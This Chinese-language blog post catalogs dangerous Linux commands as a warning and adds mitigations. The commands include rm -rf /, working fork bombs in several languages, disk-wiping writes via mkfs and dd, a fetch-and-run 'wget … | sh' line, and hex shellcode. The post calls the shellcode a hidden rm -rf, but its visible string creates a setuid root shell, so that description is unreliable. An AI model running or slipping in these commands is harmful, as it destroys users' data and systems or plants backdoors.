---
layout: default
title: "The Most Dangerous Linux Command Line"
tags: software
---

<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=27733963&auto=1&height=66"></iframe>

# 免责声明

以下代码仅供学习使用

如果造成一切损失，本人一概不负责

机器上运行时请三思

# rm -rf /*

rm -rf命令是删除文件夹及其内容最快的方式之一。

仅仅一丁点的敲错或无知都可能导致不可恢复的系统崩坏。

下列是一些rm 命令的选项：

- rm　命令在Linux下通常用来删除文件。

- rm -r 命令递归的删除文件夹，甚至是空的文件夹。

- rm -f 命令能不经过询问直接删除‘只读文件’。Linux下删除文件并不在乎该文件是否是只读的，而只是在意其父目录是否有写权限。所以，-f这个参数只是表示不必一个个删除确认，而是一律悄悄删除。另外，原始的rm命令其实也是没有删除提示的，只是一般的发行版都会将rm通过别名的方式增加-i参数来要求删除确认，而-f则抑制了这个提示。

- rm -rf /  强制删除根目录下所有东东。

- rm -rf *  强制删除当前目录的所有文件。

- rm -rf .  强制删除当前文件夹及其子文件夹。

从现在起，当你要执行rm -rf命令时请留心一点。

我们可以在“.bashrc”文件对‘rm‘命令创建rm -i的别名，来预防用 ‘rm‘命令删除文件时的事故，它会要求你确认每一个删除请求。

# fork 炸弹

这就是个fork 炸弹的实例。

具体操作是通过定义一个名为 ‘:‘的函数，它会调用自己两次，一次在前台另一次运行在后台。它会反复的执行下去直到系统崩溃。

```shell
:(){ :|:& };:
```

注解如下：

```shell
:()      # 定义函数,函数名为":",即每当输入":"时就会自动调用{}内代码
{        # ":"函數起始字元
    :    # 用递归方式调用":"函数本身
    |    # 並用管線(pipe)將其輸出引至...（因为有一个管線操作字元，因此會生成一個新的進程）
    :    # 另一次递归调用的":"函数
# 综上,":|:"表示的即是每次調用函数":"的時候就會產生兩份拷貝
    &    # 調用間脱鉤,以使最初的":"函数被關閉後為其所調用的兩個":"函數還能繼續執行
}        # ":"函數終止字元
;        # ":"函数定义结束后将要进行的操作...
:        # 调用":"函数,"引爆"fork炸弹
```

其中函数名“:”只是简化的一例，实际上可以随意设置，一个较易理解（将函数名替换为“forkbomb”）的版本如下：

```shell
forkbomb(){ forkbomb|forkbomb & } ; forkbomb
```

Windows下则可以批处理命令如下实现：

```shell
%0|%0
```
POSIX标准下的C与C++的实现：

```cpp
#include <unistd.h>

int main()
{
  while(1)
    fork();
  return 0;
}
```

Perl语言的实现：

```perl
fork while fork
```
当然也可以“熄火”

在系统中成功“引爆”fork炸弹后，可重启来使系统恢复正常运行；而若要以手动的方法使fork炸弹“熄火”，那前提就是必须杀死fork炸弹产生的所有进程。为此我们可以考虑使用程序来杀死fork炸弹产生的进程，但由于这一般需要创建新进程，且由于fork炸弹一直在探测与占用进程槽与内存空间，因而这一方法不易实现，虽用`kill`命令杀死进程后，释放出的进程会被余下的fork炸弹线程所产生的新进程占用，但可以使用循环杀死所有进程，不过也会将无关的进程杀死

```shell
for ((tmp=1;tmp<10;tmp++));do killall bash;done
```

在Windows下，用户可以退出当前用户会话的方式使系统恢复正常，但此法奏效的前提是fork炸弹是在该用户的特定会话内触发的。

由于fork炸弹透过不断的开新进程来瘫痪系统，一个防止其严重影响系统的方法就是限定一个用户能够创建的进程数的上限，在Linux系统上，可以透过ulimit这个指令达到相应的效果，例如： `ulimit -Hu 30` 这个指令可以限制每一个用户最多只能创建30个进程，还可以通过修改配置文件`/etc/security/limits.conf`来限制可生成的最大进程数来避开这枚炸弹。而FreeBSD系统的话系统管理者可以在`/etc/login.conf`底下的配置文件进行相关的设置

# > /dev/sda

这个命令会将某个‘命令‘的输出写到块设备/dev/sda中。

该操作会将在块设备中的所有数据块替换为命令写入的原始数据，从而导致整个块设备的数据丢失。

# mv 文件夹 /dev/null

这个命令会移动某个‘文件夹‘到/dev/null。

在Linux中 /dev/null 或 null 设备是一个特殊的文件，所有写入它的数据都会被清除，然后返回写操作成功。

当然，要说明的是这个命令并不能阻止数据恢复软件——所以，真正的彻底毁灭，需要采用专用的软件或者手法来完成。

```
mv /home/root/* /dev/null
```

# wget http://malicious_source -O- | sh

该命令会从一个（也许是）恶意源下载一个脚本并执行。

wget命令会下载这个脚本，而sh会（无条件的）执行下载下来的脚本。

注意: 你应该时刻注意你下载包或脚本的源。只能使用那些从可信任的源中下载脚本/程序。

# mkfs.ext3 /dev/sda

上列命令会格式化块设备‘sda’，在执行这个命令后你的块设备(硬盘驱动器)会被格式化，直接让你的系统达到不可恢复的阶段。

通常我们不会直接使用/dev/sda这样的设备，除非是作为raw设备使用。

一般都需要将sda分成类似sda1、sda2这样的分区后才使用。当然，无论你使用sda还是sda1，这样对块设备或分区进行mkfs都是毁灭性的，上面的数据都会被蒸发了。

# > file

这个命令常用来清空文件内容或记录命令输出。

不过请在执行前，确认输出的文件是空的或者还不存在，否则原来的文件可真是恢复不了了——连数据恢复软件都未必能帮助你了。

你可能真正想用的是“>>”，即累加新的输出到文件，而不是刷新那个文件。

如果用上列执行时输入错误或无知的输入类似 “> xt.conf”　的命令会覆盖配置文件或其他任何的系统配置文件。

# ^foo^bar

这个命令用来编辑先前运行的命令而无需重打整个命令。

用foobar命令时如果你没有彻底检查改变原始命令的风险，这可能导致真正的麻烦。

# dd if=/dev/random of=/dev/sda

这个命令会向块设备sda写入随机的垃圾文件从而擦出数据，让你的系统可能陷入混乱和不可恢复的状态。

记得上面说过mv到黑洞并不能彻底删除数据么？那么这个命令就是给了你一个彻底删除的方法！当然为了保险起见，你可以覆写多次。

# 隐藏命令

下面的命令其实就是上面第一个命令 (rm -rf)。

这里的代码是隐藏在十六进制里的,一个无知的用户可能就会被愚弄，如果在终端里运行下面命令可能会擦除你的根分区。

真正的危险是隐藏起来的，不会被轻易的检测到。你必须时刻留心你在做什么结果会怎样。

切记，千万不要编译／运行从未知来源的代码。

```shell
char esp[] __attribute__ ((section(“.text”))) /* e.s.p
release */
= “\xeb\x3e\x5b\x31\xc0\x50\x54\x5a\x83\xec\x64\x68″
“\xff\xff\xff\xff\x68\xdf\xd0\xdf\xd9\x68\x8d\x99″
“\xdf\x81\x68\x8d\x92\xdf\xd2\x54\x5e\xf7\x16\xf7″
“\x56\x04\xf7\x56\x08\xf7\x56\x0c\x83\xc4\x74\x56″
“\x8d\x73\x08\x56\x53\x54\x59\xb0\x0b\xcd\x80\x31″
“\xc0\x40\xeb\xf9\xe8\xbd\xff\xff\xff\x2f\x62\x69″
“\x6e\x2f\x73\x68\x00\x2d\x63\x00″
“cp -p /bin/sh /tmp/.beyond; chmod 4755
/tmp/.beyond;”;
```

